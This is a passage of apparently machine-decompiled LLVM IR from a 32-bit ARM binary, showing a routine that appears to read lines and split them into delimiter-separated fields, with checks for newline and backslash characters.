  %v9_12bc0 = load i32, i32* @r6, align 4
  %v12_12bc0 = load i32, i32* @r7, align 4
  %v15_12bc0 = load i32, i32* @r8, align 4
  %v18_12bc0 = load i32, i32* @sb, align 4
  %v21_12bc0 = load i32, i32* @sl, align 4
  %v24_12bc0 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_12bc4 = icmp eq i32* %arg1, null
  store i1 %v2_12bc4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_12bc4, label %dec_label_pc_12ed4, label %dec_label_pc_12bdc

dec_label_pc_12bdc:                               ; preds = %dec_label_pc_12bc0
  %v1_12bdc = urem i32 %arg3, 256
  store i32 %v1_12bdc, i32* @sb, align 4
  %v1_12be0 = udiv i32 %arg3, 256
  %v3_12be4 = urem i32 %v1_12be0, 256
  %v3_12be8 = mul nuw nsw i32 %v1_12bdc, 4
  %v1_12bf0 = or i32 %v3_12be8, 1
  %v1_12bfc = and i32 %arg3, 131072
  %v1_12c00 = add nsw i32 %v1_12bdc, -1
  %v1_12c0c = and i32 %arg3, 262144
  store i32 %v1_12c0c, i32* %r2.global-to-local, align 4
  %v1_12c10 = and i32 %arg3, 65536
  store i32 %v1_12c10, i32* %r3.global-to-local, align 4
  store i32 %v1_12c10, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_12c20 = add i32 %arg4, 1
  store i32 %v1_12c20, i32* @sl, align 4
  %v2_12da0 = inttoptr i32 %arg2 to i32*
  %v2_12db0 = icmp eq i32 %v1_12bfc, 0
  %v2_12e08 = icmp eq i32 %v1_12c0c, 0
  br label %dec_label_pc_12c24

dec_label_pc_12c24:                               ; preds = %dec_label_pc_12c24.backedge, %dec_label_pc_12bdc
  %v2_12c40 = phi i32 [ %v0_12c24.pre, %dec_label_pc_12c24.backedge ], [ %tmp, %dec_label_pc_12bdc ]
  %v1_12c24 = add i32 %v2_12c40, 4
  %v2_12c24 = inttoptr i32 %v1_12c24 to i32*
  %v3_12c24 = load i32, i32* %v2_12c24, align 4
  store i32 %v3_12c24, i32* %r3.global-to-local, align 4
  %v2_12c28 = icmp eq i32 %v3_12c24, 0
  store i1 %v2_12c28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12c28, label %dec_label_pc_12c30, label %dec_label_pc_12c78

dec_label_pc_12c30:                               ; preds = %dec_label_pc_12c24
  %v1_12c30 = add i32 %v2_12c40, 16
  %v2_12c30 = inttoptr i32 %v1_12c30 to i32*
  %v3_12c30 = load i32, i32* %v2_12c30, align 4
  store i32 %v3_12c30, i32* %r3.global-to-local, align 4
  %v2_12c34 = icmp eq i32 %v3_12c30, 0
  store i1 %v2_12c34, i1* %cpsr_z.global-to-local, align 1
  %v1_12c38 = add i32 %v2_12c40, 8
  %v2_12c38 = inttoptr i32 %v1_12c38 to i32*
  %v3_12c38 = load i32, i32* %v2_12c38, align 4
  store i32 %v3_12c38, i32* %r3.global-to-local, align 4
  br i1 %v2_12c34, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_12c30
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_12c30, align 4
  %v0_12c44.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_12c30, %bb
  %v0_12c44 = phi i32 [ %v0_12c44.pre, %bb ], [ %v3_12c38, %dec_label_pc_12c30 ]
  %v2_12c44 = icmp eq i32 %v0_12c44, 0
  store i1 %v2_12c44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12c44, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_12bf0, i32* %r3.global-to-local, align 4
  %v2_12c4c = load i32, i32* @r5, align 4
  %v3_12c4c = add i32 %v2_12c4c, 8
  %v4_12c4c = inttoptr i32 %v3_12c4c to i32*
  store i32 %v1_12bf0, i32* %v4_12c4c, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_12c50 = load i32, i32* @r5, align 4
  %v1_12c50 = add i32 %v0_12c50, 16
  %v2_12c50 = inttoptr i32 %v1_12c50 to i32*
  %v3_12c50 = load i32, i32* %v2_12c50, align 4
  store i32 %v3_12c50, i32* %r0.global-to-local, align 4
  %v1_12c54 = add i32 %v0_12c50, 8
  %v2_12c54 = inttoptr i32 %v1_12c54 to i32*
  %v3_12c54 = load i32, i32* %v2_12c54, align 4
  store i32 %v3_12c54, i32* %r3.global-to-local, align 4
  %v2_12c58 = add i32 %v3_12c54, %v3_12c50
  store i32 %v2_12c58, i32* %r0.global-to-local, align 4
  %v1_12c5c = call i32 @function_fd60(i32 %v2_12c58)
  store i32 %v1_12c5c, i32* %r0.global-to-local, align 4
  %v2_12c60 = icmp eq i32 %v1_12c5c, 0
  store i1 %v2_12c60, i1* %cpsr_z.global-to-local, align 1
  %v1_12c64 = load i32, i32* @r5, align 4
  %v2_12c64 = add i32 %v1_12c64, 4
  %v3_12c64 = inttoptr i32 %v2_12c64 to i32*
  store i32 %v1_12c5c, i32* %v3_12c64, align 4
  br i1 %v2_12c60, label %dec_label_pc_12ed4, label %dec_label_pc_12c6c

dec_label_pc_12c6c:                               ; preds = %.thread
  %v0_12c6c = load i32, i32* @r5, align 4
  %v1_12c6c = add i32 %v0_12c6c, 20
  %v2_12c6c = inttoptr i32 %v1_12c6c to i32*
  %v3_12c6c = load i32, i32* %v2_12c6c, align 4
  %v1_12c70 = or i32 %v3_12c6c, 1
  store i32 %v1_12c70, i32* %r3.global-to-local, align 4
  store i32 %v1_12c70, i32* %v2_12c6c, align 4
  %v0_12c78.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12c78

dec_label_pc_12c78:                               ; preds = %dec_label_pc_12c24, %dec_label_pc_12c6c
  %v1_12c80 = phi i32 [ %v2_12c40, %dec_label_pc_12c24 ], [ %v0_12c78.pre, %dec_label_pc_12c6c ]
  %v1_12c78 = add i32 %v1_12c80, 4
  %v2_12c78 = inttoptr i32 %v1_12c78 to i32*
  %v3_12c78 = load i32, i32* %v2_12c78, align 4
  store i32 %v3_12c78, i32* %r2.global-to-local, align 4
  %v4_12c78 = add i32 %v1_12c80, 8
  %v5_12c78 = inttoptr i32 %v4_12c78 to i32*
  %v6_12c78 = load i32, i32* %v5_12c78, align 4
  %v2_12c7c = add i32 %v6_12c78, %v3_12c78
  store i32 %v2_12c7c, i32* %r3.global-to-local, align 4
  %v2_12c80 = add i32 %v1_12c80, 12
  %v3_12c80 = inttoptr i32 %v2_12c80 to i32*
  store i32 %v2_12c7c, i32* %v3_12c80, align 4
  %v0_12c84 = load i32, i32* @fp, align 4
  store i32 %v0_12c84, i32* @r6, align 4
  br label %dec_label_pc_12c88

dec_label_pc_12c88:                               ; preds = %dec_label_pc_12d14, %dec_label_pc_12d00, %dec_label_pc_12c78
  %v0_12c90 = phi i32 [ %v0_12c84, %dec_label_pc_12c78 ], [ %v1_12d00, %dec_label_pc_12d00 ], [ %v0_12c90.pre.pre, %dec_label_pc_12d14 ]
  %v0_12c88 = load i32, i32* @r5, align 4
  %v1_12c88 = add i32 %v0_12c88, 12
  store i32 %v1_12c88, i32* %r0.global-to-local, align 4
  %v1_12c8c = inttoptr i32 %v1_12c88 to i32*
  %v2_12c8c = load i32, i32* %v1_12c8c, align 4
  store i32 %v2_12c8c, i32* %r0.global-to-local, align 4
  %v3_12c8c = add i32 %v0_12c88, 16
  %v4_12c8c = inttoptr i32 %v3_12c8c to i32*
  %v5_12c8c = load i32, i32* %v4_12c8c, align 4
  %v2_12c90 = add i32 %v2_12c8c, %v0_12c90
  store i32 %v2_12c90, i32* %r0.global-to-local, align 4
  %v2_12c94 = sub i32 %v5_12c8c, %v0_12c90
  %v1_12c98 = inttoptr i32 %v0_12c88 to i32*
  %v2_12c98 = load i32, i32* %v1_12c98, align 4
  store i32 %v2_12c98, i32* %r2.global-to-local, align 4
  %v3_12c9c = call i32 @function_ea64(i32 %v2_12c90, i32 %v2_12c94, i32 %v2_12c98)
  store i32 %v3_12c9c, i32* %r0.global-to-local, align 4
  store i32 %v3_12c9c, i32* %r4.global-to-local, align 4
  %v2_12ca0 = icmp eq i32 %v3_12c9c, 0
  store i1 %v2_12ca0, i1* %cpsr_z.global-to-local, align 1
  %v0_12ca8 = load i32, i32* @r5, align 4
  %v1_12ca8 = add i32 %v0_12ca8, 12
  br i1 %v2_12ca0, label %dec_label_pc_12ca8, label %dec_label_pc_12cc0

dec_label_pc_12ca8:                               ; preds = %dec_label_pc_12c88
  store i32 %v1_12ca8, i32* %r0.global-to-local, align 4
  %v1_12cac = inttoptr i32 %v1_12ca8 to i32*
  %v2_12cac = load i32, i32* %v1_12cac, align 4
  store i32 %v2_12cac, i32* %r0.global-to-local, align 4
  %v3_12cac = add i32 %v0_12ca8, 16
  %v4_12cac = inttoptr i32 %v3_12cac to i32*
  %v5_12cac = load i32, i32* %v4_12cac, align 4
  store i32 %v5_12cac, i32* @r2, align 4
  %v2_12cb4 = inttoptr i32 %v2_12cac to i8*
  %v3_12cb4 = call i32 @function_f240(i8* %v2_12cb4, i32 0)
  store i32 %v3_12cb4, i32* %r0.global-to-local, align 4
  %v0_12cb8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12ed8

dec_label_pc_12cc0:                               ; preds = %dec_label_pc_12c88
  %v2_12cc0 = inttoptr i32 %v1_12ca8 to i32*
  %v3_12cc0 = load i32, i32* %v2_12cc0, align 4
  store i32 %v3_12cc0, i32* @r4, align 4
  %v1_12cc4 = load i32, i32* @r6, align 4
  %v2_12cc4 = add i32 %v1_12cc4, %v3_12cc0
  store i32 %v2_12cc4, i32* @r0, align 4
  %v0_12cc8 = call i32 @function_f2e0()
  %v0_12cd0 = load i32, i32* @r6, align 4
  %v2_12cd0 = add i32 %v0_12cd0, %v0_12cc8
  store i32 %v2_12cd0, i32* @r6, align 4
  %v0_12cd4 = load i32, i32* @r4, align 4
  store i32 %v0_12cd4, i32* @r0, align 4
  %v2_12cd8 = call i32 @function_14918(i32 %v0_12cd4, i32 10)
  store i32 %v2_12cd8, i32* %r0.global-to-local, align 4
  %v2_12cdc = icmp eq i32 %v2_12cd8, 0
  store i1 %v2_12cdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12cdc, label %dec_label_pc_12d08, label %dec_label_pc_12ce4

dec_label_pc_12ce4:                               ; preds = %dec_label_pc_12cc0
  %v1_12ce4 = inttoptr i32 %v2_12cd8 to i8*
  %v2_12ce4 = load i8, i8* %v1_12ce4, align 1
  %v3_12ce4 = zext i8 %v2_12ce4 to i32
  %v1_12ce8 = add nuw nsw i32 %v3_12ce4, 255
  %v1_12cec = urem i32 %v1_12ce8, 256
  store i32 %v1_12cec, i32* %r3.global-to-local, align 4
  %v7_12cf0 = icmp eq i32 %v1_12cec, 92
  store i1 %v7_12cf0, i1* %cpsr_z.global-to-local, align 1
  %v1_12cf4 = trunc i32 %v1_12ce8 to i8
  store i8 %v1_12cf4, i8* %v1_12ce4, align 1
  %v0_12cf8 = load i32, i32* @r6, align 4
  %v1_12cf8 = add i32 %v0_12cf8, -1
  store i32 %v1_12cf8, i32* @r6, align 4
  %v0_12cfc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12cfc, label %dec_label_pc_12d00, label %dec_label_pc_12d8c

dec_label_pc_12d00:                               ; preds = %dec_label_pc_12ce4
  %v1_12d00 = add i32 %v0_12cf8, -2
  store i32 %v1_12d00, i32* @r6, align 4
  br label %dec_label_pc_12c88

dec_label_pc_12d08:                               ; preds = %dec_label_pc_12cc0
  %v0_12d08 = load i32, i32* @r5, align 4
  %v1_12d08 = add i32 %v0_12d08, 20
  %v2_12d08 = inttoptr i32 %v1_12d08 to i32*
  %v3_12d08 = load i32, i32* %v2_12d08, align 4
  store i32 %v3_12d08, i32* %r3.global-to-local, align 4
  %v2_12d0c = icmp eq i32 %v3_12d08, 0
  store i1 %v2_12d0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12d0c, label %dec_label_pc_12d44, label %dec_label_pc_12d14

dec_label_pc_12d14:                               ; preds = %dec_label_pc_12d08
  %v1_12d14 = add i32 %v0_12d08, 16
  %v2_12d14 = inttoptr i32 %v1_12d14 to i32*
  %v3_12d14 = load i32, i32* %v2_12d14, align 4
  store i32 %v3_12d14, i32* %r3.global-to-local, align 4
  %v1_12d18 = add i32 %v0_12d08, 8
  %v2_12d18 = inttoptr i32 %v1_12d18 to i32*
  %v3_12d18 = load i32, i32* %v2_12d18, align 4
  %v1_12d1c = add i32 %v3_12d14, 4096
  store i32 %v1_12d1c, i32* %r3.global-to-local, align 4
  %v2_12d20 = add i32 %v3_12d18, %v1_12d1c
  store i32 %v1_12d1c, i32* %v2_12d14, align 4
  %v0_12d28 = load i32, i32* @r5, align 4
  %v1_12d28 = add i32 %v0_12d28, 4
  %v2_12d28 = inttoptr i32 %v1_12d28 to i32*
  %v3_12d28 = load i32, i32* %v2_12d28, align 4
  store i32 %v3_12d28, i32* %r0.global-to-local, align 4
  %v2_12d2c = inttoptr i32 %v3_12d28 to i32*
  %v3_12d2c = call i32 @function_14f14(i32* %v2_12d2c, i32 %v2_12d20)
  store i32 %v3_12d2c, i32* %r0.global-to-local, align 4
  %v0_12d30 = load i32, i32* @r5, align 4
  %v1_12d30 = add i32 %v0_12d30, 8
  %v2_12d30 = inttoptr i32 %v1_12d30 to i32*
  %v3_12d30 = load i32, i32* %v2_12d30, align 4
  %v2_12d34 = add i32 %v3_12d30, %v3_12d2c
  store i32 %v2_12d34, i32* %r3.global-to-local, align 4
  %v2_12d38 = add i32 %v0_12d30, 12
  %v3_12d38 = inttoptr i32 %v2_12d38 to i32*
  store i32 %v2_12d34, i32* %v3_12d38, align 4
  %v1_12d3c = load i32, i32* @r5, align 4
  %v2_12d3c = add i32 %v1_12d3c, 4
  %v3_12d3c = inttoptr i32 %v2_12d3c to i32*
  store i32 %v3_12d2c, i32* %v3_12d3c, align 4
  %v0_12c90.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12c88

dec_label_pc_12d44:                               ; preds = %dec_label_pc_12d08, %.dec_label_pc_12d44_crit_edge
  %v0_12d44 = phi i32 [ %v0_12d44.pre, %.dec_label_pc_12d44_crit_edge ], [ %v0_12d08, %dec_label_pc_12d08 ]
  %v1_12d44 = inttoptr i32 %v0_12d44 to i32*
  %v2_12d44 = load i32, i32* %v1_12d44, align 4
  %v1_12d48 = add i32 %v2_12d44, 52
  %v2_12d48 = inttoptr i32 %v1_12d48 to i32*
  %v3_12d48 = load i32, i32* %v2_12d48, align 4
  store i32 %v3_12d48, i32* %r3.global-to-local, align 4
  %v2_12d4c = icmp eq i32 %v3_12d48, 0
  store i1 %v2_12d4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12d4c, label %dec_label_pc_12d78, label %dec_label_pc_12d54

dec_label_pc_12d54:                               ; preds = %dec_label_pc_12d44
  %v1_12d54 = add i32 %v2_12d44, 16
  %v2_12d54 = inttoptr i32 %v1_12d54 to i32*
  %v3_12d54 = load i32, i32* %v2_12d54, align 4
  store i32 %v3_12d54, i32* %r2.global-to-local, align 4
  %v1_12d58 = add i32 %v2_12d44, 24
  %v2_12d58 = inttoptr i32 %v1_12d58 to i32*
  %v3_12d58 = load i32, i32* %v2_12d58, align 4
  store i32 %v3_12d58, i32* %r3.global-to-local, align 4
  %v3_12d5c = icmp ult i32 %v3_12d54, %v3_12d58
  %v9_12d5c = icmp eq i32 %v3_12d54, %v3_12d58
  store i1 %v9_12d5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12d5c, label %dec_label_pc_12d80thread-pre-split, label %dec_label_pc_12d6c

dec_label_pc_12d6c:                               ; preds = %dec_label_pc_12d54
  store i32 %v2_12d44, i32* %r0.global-to-local, align 4
  %v1_12d70 = inttoptr i32 %v2_12d44 to i16*
  %v2_12d70 = call i32 @function_13e54(i16* %v1_12d70)
  store i32 %v2_12d70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12d80

dec_label_pc_12d78:                               ; preds = %dec_label_pc_12d44
  store i32 %v2_12d44, i32* %r0.global-to-local, align 4
  %v1_12d7c = call i32 @function_13d78(i32 %v2_12d44)
  store i32 %v1_12d7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12d80

dec_label_pc_12d80thread-pre-split:               ; preds = %dec_label_pc_12d54
  %v2_12d60 = inttoptr i32 %v3_12d54 to i8*
  %v3_12d60 = load i8, i8* %v2_12d60, align 1
  %v4_12d60 = zext i8 %v3_12d60 to i32
  store i32 %v4_12d60, i32* %r0.global-to-local, align 4
  %v6_12d60 = add i32 %v3_12d54, 1
  store i32 %v6_12d60, i32* %r2.global-to-local, align 4
  store i32 %v6_12d60, i32* %v2_12d54, align 4
  %v0_12d80.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12d80

dec_label_pc_12d80:                               ; preds = %dec_label_pc_12d80thread-pre-split, %dec_label_pc_12d6c, %dec_label_pc_12d78
  %v1_12d84 = phi i32 [ %v0_12d80.pr, %dec_label_pc_12d80thread-pre-split ], [ %v2_12d70, %dec_label_pc_12d6c ], [ %v1_12d7c, %dec_label_pc_12d78 ]
  %v7_12d80 = icmp eq i32 %v1_12d84, 10
  store i1 %v7_12d80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12d80, label %dec_label_pc_12d8c.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_12d80
  %v8_12d84 = icmp eq i32 %v1_12d84, -1
  store i1 %v8_12d84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12d84, label %dec_label_pc_12d8c.loopexit, label %.dec_label_pc_12d44_crit_edge

.dec_label_pc_12d44_crit_edge:                    ; preds = %bb68
  %v0_12d44.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12d44

dec_label_pc_12d8c.loopexit:                      ; preds = %bb68, %dec_label_pc_12d80
  %v0_12d8c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12d8c

dec_label_pc_12d8c:                               ; preds = %dec_label_pc_12ce4, %dec_label_pc_12d8c.loopexit
  %v0_12d8c = phi i32 [ %v0_12d8c.pre, %dec_label_pc_12d8c.loopexit ], [ %v1_12cf8, %dec_label_pc_12ce4 ]
  %v7_12d8c = icmp eq i32 %v0_12d8c, -1
  store i1 %v7_12d8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12d8c, label %dec_label_pc_12ed4, label %dec_label_pc_12d94

dec_label_pc_12d94:                               ; preds = %dec_label_pc_12d8c
  %v0_12d94 = load i32, i32* @r5, align 4
  %v1_12d94 = add i32 %v0_12d94, 4
  %v2_12d94 = inttoptr i32 %v1_12d94 to i32*
  %v3_12d94 = load i32, i32* %v2_12d94, align 4
  store i32 %v3_12d94, i32* %r0.global-to-local, align 4
  store i32 %v3_12be8, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_12d94, i32* %v2_12da0, align 4
  %v0_12da4 = load i32, i32* @fp, align 4
  %v2_12da8 = inttoptr i32 %v3_12d94 to i8*
  %v3_12da8 = call i32 @function_f240(i8* %v2_12da8, i32 %v0_12da4)
  store i32 %v3_12da8, i32* %r0.global-to-local, align 4
  store i32 %v1_12bfc, i32* %r2.global-to-local, align 4
  store i1 %v2_12db0, i1* %cpsr_z.global-to-local, align 1
  %v0_12db4 = load i32, i32* @r5, align 4
  %v1_12db4 = add i32 %v0_12db4, 12
  %v2_12db4 = inttoptr i32 %v1_12db4 to i32*
  %v3_12db4 = load i32, i32* %v2_12db4, align 4
  store i32 %v3_12db4, i32* @r4, align 4
  br i1 %v2_12db0, label %dec_label_pc_12dcc, label %dec_label_pc_12dbc

dec_label_pc_12dbc:                               ; preds = %dec_label_pc_12d94
  store i32 %v3_12db4, i32* @r0, align 4
  %v1_12dc4 = inttoptr i32 %v3_12db4 to i8*
  %v2_12dc4 = call i32 @function_1476c(i8* %v1_12dc4)
  store i32 %v2_12dc4, i32* %r0.global-to-local, align 4
  %v0_12dc8 = load i32, i32* @r4, align 4
  %v2_12dc8 = add i32 %v0_12dc8, %v2_12dc4
  store i32 %v2_12dc8, i32* @r4, align 4
  br label %dec_label_pc_12dcc

dec_label_pc_12dcc:                               ; preds = %dec_label_pc_12d94, %dec_label_pc_12dbc
  %v0_12ea413 = phi i32 [ %v3_12db4, %dec_label_pc_12d94 ], [ %v2_12dc8, %dec_label_pc_12dbc ]
  %v1_12dcc = inttoptr i32 %v0_12ea413 to i8*
  %v2_12dcc = load i8, i8* %v1_12dcc, align 1
  %v3_12dcc = zext i8 %v2_12dcc to i32
  store i32 %v3_12dcc, i32* %r2.global-to-local, align 4
  %v2_12dd0 = icmp eq i8 %v2_12dcc, 0
  store i1 %v2_12dd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12dd0, label %dec_label_pc_12c24.backedge, label %dec_label_pc_12dd8

dec_label_pc_12c24.backedge:                      ; preds = %dec_label_pc_12dcc, %dec_label_pc_12ecc, %dec_label_pc_12dd8
  %v0_12c24.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12c24

dec_label_pc_12dd8:                               ; preds = %dec_label_pc_12dcc
  %v0_12dd8 = load i32, i32* @r7, align 4
  %v1_12dd8 = inttoptr i32 %v0_12dd8 to i8*
  %v2_12dd8 = load i8, i8* %v1_12dd8, align 1
  %v3_12dd8 = zext i8 %v2_12dd8 to i32
  store i32 %v3_12dd8, i32* %r3.global-to-local, align 4
  %v9_12ddc = icmp eq i8 %v2_12dd8, %v2_12dcc
  store i1 %v9_12ddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12ddc, label %dec_label_pc_12c24.backedge, label %dec_label_pc_12ea4.preheader

dec_label_pc_12ea4.preheader:                     ; preds = %dec_label_pc_12dd8
  %v1_12de0 = load i32, i32* @fp, align 4
  store i32 %v1_12de0, i32* @r6, align 4
  %v2_12ea415 = load i8, i8* %v1_12dcc, align 1
  %v3_12ea416 = zext i8 %v2_12ea415 to i32
  store i32 %v3_12ea416, i32* %r2.global-to-local, align 4
  %v2_12ea817 = icmp eq i8 %v2_12ea415, 0
  store i1 %v2_12ea817, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12ea817, label %dec_label_pc_12ec0, label %dec_label_pc_12eb0.preheader

dec_label_pc_12eb0.preheader:                     ; preds = %dec_label_pc_12ea4.preheader
  %v2_12eb082 = load i8, i8* %v1_12dd8, align 1
  %v3_12eb083 = zext i8 %v2_12eb082 to i32
  store i32 %v3_12eb083, i32* %r3.global-to-local, align 4
  %v9_12eb486 = icmp eq i8 %v2_12eb082, %v2_12ea415
  store i1 %v9_12eb486, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12eb486, label %dec_label_pc_12ec0, label %bb74

dec_label_pc_12dec:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_12df0 = load i32, i32* %v2_12da0, align 4
  store i32 %v2_12df0, i32* %r3.global-to-local, align 4
  store i32 %v1_12c00, i32* %r2.global-to-local, align 4
  %v9_12df8 = icmp eq i32 %v2_12dfc88, %v1_12c00
  store i1 %v9_12df8, i1* %cpsr_z.global-to-local, align 1
  %v5_12dfc = mul i32 %v2_12dfc88, 4
  %v6_12dfc = add i32 %v2_12df0, %v5_12dfc
  %v7_12dfc = inttoptr i32 %v6_12dfc to i32*
  store i32 %v0_12dfc87, i32* %v7_12dfc, align 4
  br i1 %v9_12df8, label %dec_label_pc_12e04, label %dec_label_pc_12e10

dec_label_pc_12e04:                               ; preds = %dec_label_pc_12dec
  store i32 %v1_12c0c, i32* %r3.global-to-local, align 4
  store i1 %v2_12e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12e08, label %dec_label_pc_12e10, label %dec_label_pc_12e30

dec_label_pc_12e10:                               ; preds = %dec_label_pc_12e04, %dec_label_pc_12dec
  %v0_12e10 = load i32, i32* @r7, align 4
  %v1_12e10 = inttoptr i32 %v0_12e10 to i8*
  %v2_12e10 = load i8, i8* %v1_12e10, align 1
  %v3_12e10 = zext i8 %v2_12e10 to i32
  store i32 %v3_12e10, i32* %r3.global-to-local, align 4
  %v2_12e14 = icmp eq i8 %v2_12e10, 0
  store i1 %v2_12e14, i1* %cpsr_z.global-to-local, align 1
  %v0_12e18 = load i32, i32* @r4, align 4
  store i32 %v0_12e18, i32* @r0, align 4
  %v1_12e1c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_12e14, i32 %v1_12e1c, i32 %v0_12e10
  store i32 %storemerge, i32* @r1, align 4
  %v0_12e24 = call i32 @function_14598()
  store i32 %v0_12e24, i32* %r0.global-to-local, align 4
  %v0_12e28 = load i32, i32* @r4, align 4
  %v2_12e28 = add i32 %v0_12e28, %v0_12e24
  store i32 %v2_12e28, i32* @r4, align 4
  br label %dec_label_pc_12e68

dec_label_pc_12e30:                               ; preds = %dec_label_pc_12e04
  %v0_12e30 = load i32, i32* @r4, align 4
  store i32 %v0_12e30, i32* @r0, align 4
  %v0_12e34 = load i32, i32* @r7, align 4
  %v1_12e34 = inttoptr i32 %v0_12e34 to i8*
  %v2_12e34 = load i8, i8* %v1_12e34, align 1
  %v3_12e34 = zext i8 %v2_12e34 to i32
  %v5_12e38 = call i32 @function_1482c(i32 %v0_12e30, i32 %v3_12e34, i32 %v1_12c00, i32 %v1_12c0c)
  store i32 %v5_12e38, i32* %r0.global-to-local, align 4
  store i32 %v1_12bfc, i32* %r2.global-to-local, align 4
  store i1 %v2_12db0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_12e38, i32* @r4, align 4
  br i1 %v2_12db0, label %dec_label_pc_12e68, label %dec_label_pc_12e54

dec_label_pc_12e50:                               ; preds = %dec_label_pc_12e54
  %v1_12e50 = add i32 %v0_12e68.pre, -1
  store i32 %v1_12e50, i32* @r4, align 4
  br label %dec_label_pc_12e54

dec_label_pc_12e54:                               ; preds = %dec_label_pc_12e30, %dec_label_pc_12e50
  %v0_12e54 = phi i32 [ %v1_12e50, %dec_label_pc_12e50 ], [ %v5_12e38, %dec_label_pc_12e30 ]
  %v1_12e54 = add i32 %v0_12e54, -1
  %v2_12e54 = inttoptr i32 %v1_12e54 to i8*
  %v3_12e54 = load i8, i8* %v2_12e54, align 1
  %v4_12e54 = zext i8 %v3_12e54 to i32
  %v0_12e58 = load i32, i32* @sl, align 4
  store i32 %v0_12e58, i32* @r0, align 4
  %v2_12e5c = call i32 @function_14918(i32 %v0_12e58, i32 %v4_12e54)
  store i32 %v2_12e5c, i32* %r0.global-to-local, align 4
  %v2_12e60 = icmp eq i32 %v2_12e5c, 0
  store i1 %v2_12e60, i1* %cpsr_z.global-to-local, align 1
  %v0_12e68.pre = load i32, i32* @r4, align 4
  br i1 %v2_12e60, label %dec_label_pc_12e68, label %dec_label_pc_12e50

dec_label_pc_12e68:                               ; preds = %dec_label_pc_12e54, %dec_label_pc_12e30, %dec_label_pc_12e10
  %v3_12e74 = phi i32 [ %v5_12e38, %dec_label_pc_12e30 ], [ %v2_12e28, %dec_label_pc_12e10 ], [ %v0_12e68.pre, %dec_label_pc_12e54 ]
  %v1_12e68 = inttoptr i32 %v3_12e74 to i8*
  %v2_12e68 = load i8, i8* %v1_12e68, align 1
  %v3_12e68 = zext i8 %v2_12e68 to i32
  store i32 %v3_12e68, i32* %r2.global-to-local, align 4
  %v0_12e6c = load i32, i32* @r7, align 4
  %v1_12e6c = inttoptr i32 %v0_12e6c to i8*
  %v2_12e6c = load i8, i8* %v1_12e6c, align 1
  %v3_12e6c = zext i8 %v2_12e6c to i32
  store i32 %v3_12e6c, i32* %r3.global-to-local, align 4
  %v9_12e70 = icmp eq i8 %v2_12e6c, %v2_12e68
  store i1 %v9_12e70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12e70, label %bb71, label %dec_label_pc_12e7c

bb71:                                             ; preds = %dec_label_pc_12e68
  %v1_12e74 = load i32, i32* @fp, align 4
  %v2_12e74 = trunc i32 %v1_12e74 to i8
  store i8 %v2_12e74, i8* %v1_12e68, align 1
  %v0_12e78.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12e78.pr, label %bb73, label %.dec_label_pc_12e7c_crit_edge

.dec_label_pc_12e7c_crit_edge:                    ; preds = %bb71
  %v0_12e7c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12e7c

dec_label_pc_12e7c:                               ; preds = %.dec_label_pc_12e7c_crit_edge, %dec_label_pc_12e68
  %v0_12e7c = phi i32 [ %v0_12e7c.pre, %.dec_label_pc_12e7c_crit_edge ], [ %v3_12e68, %dec_label_pc_12e68 ]
  %v2_12e7c = icmp eq i32 %v0_12e7c, 0
  store i1 %v2_12e7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12e7c, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_12e7c
  %v1_12e80 = load i32, i32* @fp, align 4
  %v2_12e80 = trunc i32 %v1_12e80 to i8
  %v3_12e80 = load i32, i32* @r4, align 4
  %v4_12e80 = inttoptr i32 %v3_12e80 to i8*
  store i8 %v2_12e80, i8* %v4_12e80, align 1
  %v5_12e80 = load i32, i32* @r4, align 4
  %v6_12e80 = add i32 %v5_12e80, 1
  store i32 %v6_12e80, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_12e7c, %bb72
  %v2_12e84 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_12e84, i32* %r3.global-to-local, align 4
  %v2_12e88 = icmp eq i32 %v2_12e84, 0
  store i1 %v2_12e88, i1* %cpsr_z.global-to-local, align 1
